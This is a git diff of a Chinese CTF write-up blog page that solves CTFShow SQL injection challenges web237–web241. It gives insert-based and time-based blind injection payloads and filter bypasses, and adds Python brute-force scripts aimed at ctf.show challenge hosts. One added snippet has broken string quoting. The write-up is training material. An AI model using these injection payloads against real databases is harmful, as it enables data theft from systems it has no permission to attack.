@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png">
 <meta property="article:published_time" content="2020-11-01T10:01:49.000Z">
-<meta property="article:modified_time" content="2020-11-29T16:44:22.408Z">
+<meta property="article:modified_time" content="2020-11-30T06:29:21.120Z">
 <meta property="article:author" content="yq1ng">
 <meta property="article:tag" content="...">
 <meta name="twitter:card" content="summary">
@@ -221,7 +221,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-30 00:44:22" itemprop="dateModified" datetime="2020-11-30T00:44:22+08:00">2020-11-30</time>
+                <time title="修改时间：2020-11-30 14:29:21" itemprop="dateModified" datetime="2020-11-30T14:29:21+08:00">2020-11-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -250,14 +250,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>68k</span>
+              <span>69k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1:54</span>
+              <span>1:55</span>
             </span>
 
         </div>
@@ -593,8 +593,11 @@
 <h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>sql: <code>$sql = &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code>，无过滤<br>注意：insert盲注会产生大量数据<br>api下插入不得行，抓包发现是在<code>URL/api/insert.php</code>下<br>表名：<code>username=yq1ng&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=yq1ng</code><br>列名：<code>username=yq1ng&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;))#&amp;password=yq1ng</code><br>flag: <code>username=yq1ng&#39;,(select group_concat(flagass23s3) from flag))#&amp;password=yq1ng</code></p>
 <h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>过滤空格<br>那就不用呗，前面的老套路，括号淦，表名：<code>username=yq1ng&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=yq1ng</code><br>列名：<code>username=yq1ng&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)))#&amp;password=yq1ng</code><br>flag: <code>username=yq1ng&#39;,(select(group_concat(flag))from(flagb)))#&amp;password=yq1ng</code></p>
 <h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>增加过滤<code>or</code><br>这是又过了一遍？前面的无列名注入？什么你忘了？回去看看web235！<br>表名：<code>username=yq1ng&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=yq1ng</code><br>列名：占坑，试了没弄出来<br>flag: <code>username=yq1ng&#39;,(select(group_concat(flag))from(flagbb)))#&amp;password=yq1ng</code>，猜的。。。</p>
-<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>sql：<code>$sql = &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code><br>waf: <code>空格 or sys mysql</code><br>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写<br>就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去<code>URL/page.php</code>最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110144623">Y4师傅</a></p>
+<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>sql：<code>$sql = &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code><br>waf: <code>空格 or sys mysql</code><br>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写<br>就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去<code>URL/page.php</code>最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110144623">Y4师傅</a>，先附上师傅脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show&quot;</span></span><br><span class="line">url_insert = url + <span class="string">&quot;/api/insert.php&quot;</span></span><br><span class="line">url_flag = url + <span class="string">&quot;/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看命函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span>():</span></span><br><span class="line">    sttr = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line">    str_list = [random.choice(sttr) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(flag<span class="subst">&#123;generate_random_str()&#125;</span>)))#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url_insert, data=data)</span><br><span class="line">    r2 = requests.get(url_flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r2.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span>  <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                print(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:     utf-8</span></span><br><span class="line"><span class="comment"># @Author:      yq1ng</span></span><br><span class="line"><span class="comment"># @Date:        2020-11-29 23:00</span></span><br><span class="line"><span class="comment"># @challenges： web240</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d140c93f-746e-41d4-a13e-02c42e17237d.chall.ctf.show/api/insert.php&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TableName</span>():</span></span><br><span class="line">    values = <span class="string">&quot;ab&quot;</span></span><br><span class="line">    table = [random.choice(values) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">    tableName = <span class="string">&#x27;&#x27;</span>.join(table)</span><br><span class="line">    <span class="keyword">return</span> tableName</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    data[<span class="string">&quot;username&quot;</span>] = <span class="string">f&quot;yq1ng&#x27;,(select(flag)from(flag<span class="subst">&#123;TableName()&#125;</span>)))#&quot;</span></span><br><span class="line">    s = requests.post(url, data = data)</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure>
+<p>或者你不看命，最多32次必出！自行加载</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tbName</span>():</span></span><br><span class="line">    f = open(<span class="string">&quot;./tbname.txt&#x27;,&#x27;w+&#x27;)</span></span><br><span class="line"><span class="string">    for a1 in list1:</span></span><br><span class="line"><span class="string">        for a2 in list1:</span></span><br><span class="line"><span class="string">            for a3 in list1:</span></span><br><span class="line"><span class="string">                for a4 in list1:</span></span><br><span class="line"><span class="string">                    for a5 in list1:</span></span><br><span class="line"><span class="string">                        f.write(a1+a2+a3+a4+a5+&quot;</span>\n<span class="string">&quot;)</span></span><br><span class="line"><span class="string">tbName()</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>无过滤的delete注入，基于时间盲注，表的内容不要太多，因为返回时间是<code>sleep(x)*条数</code>（flag不对建议再跑一次，或者不急的话可以增加时间，因为服务器响应可能有时候比较慢）</p>
 <p>payload：<code>URL/api/delete.php</code> 爆表：<code>-1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#39;%c&#39;,sleep(1),0)</code>，其他的就是正常注入，改一下if条件就好</p>
@@ -808,7 +811,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -878,13 +881,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">257k</span>
+    <span title="站点总字数">259k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">7:08</span>
+    <span title="站点阅读时长">7:11</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
